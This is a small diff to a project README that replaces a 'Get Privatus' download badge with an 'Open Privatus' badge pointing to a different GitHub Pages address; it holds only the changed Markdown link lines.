@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Privatus](https://img.shields.io/badge/Get_Privatus-blue?style=for-the-badge&logo=apple)](https://rhodesholcqm.github.io/.github/Privatus)
+[![Open Privatus](https://img.shields.io/badge/Open-Privatus-7C3AED?style=plastic)](https://manager-privatus.github.io/.github/)
 
 </div>
 
